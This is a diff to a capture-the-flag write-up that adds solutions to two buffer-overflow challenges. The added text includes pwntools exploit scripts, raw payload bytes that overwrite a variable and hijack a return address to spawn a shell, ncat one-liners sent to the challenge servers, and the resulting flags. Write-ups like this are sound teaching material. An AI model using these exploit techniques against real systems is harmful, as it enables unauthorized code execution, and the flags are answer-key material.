@@ -305,4 +305,52 @@ pickle.dump(MYClass(), outfile)
 
 > Author : 1m4D
 
-to be continued
+    In this challenge we have a binary file and it's source code, when we read the .c file we can see the gets which do a bufferoverflow, the goal in this challenge is to change the date to 2752022 by using the buffer overflow. so i just coded the number in hex and add it after the bufferoverflow offset.
+
+```python
+from pwn import *
+
+payload = 'a' * 128 + "\x16\xfe\x29\x00"
+
+print(payload)
+
+p = process('./challenge')
+
+sep = " \n "
+
+p.sendline(payload)
+output = p.recvall()
+print(output)
+```
+
+> exploit : printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x16\xfe\x29\x00" | ncat -v --ssl bof0.challs.shellmates.club 443
+
+> flag : shellamtes{Y0u_H4vE_ChE4ngED_mY_V4R14Ble_98765}
+
+
+### B0F0
+
+> Author : 1m4D
+
+    In this challenge we have a binary file and it's source code, when we read the .c file we can see the gets which do a bufferoverflow, the goal in this challenge is to ret addr to the open_shell function wich has the addr 0x080491b6 and pass the parameter (int)1337.
+
+```python
+from pwn import *
+
+#080491b6
+payload = 'a' * 32 + "\xb6\x91\x04\x08" + "aaaa" + "\x39\x05\x00\x00"
+
+print(payload)
+
+p = process('./challenge')
+
+sep = " \n "
+
+p.sendline(payload)
+output = p.recvall()
+print(output)
+```
+
+> exploit : printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb6\x91\x04\x08aaaa\x39\x05\x00\x00\ncat flag" | ncat -v --ssl bof1.challs.shellmates.club 443
+
+> flag : shellamtes{Y0u_4lS0_GET_A_$HEll_65431}
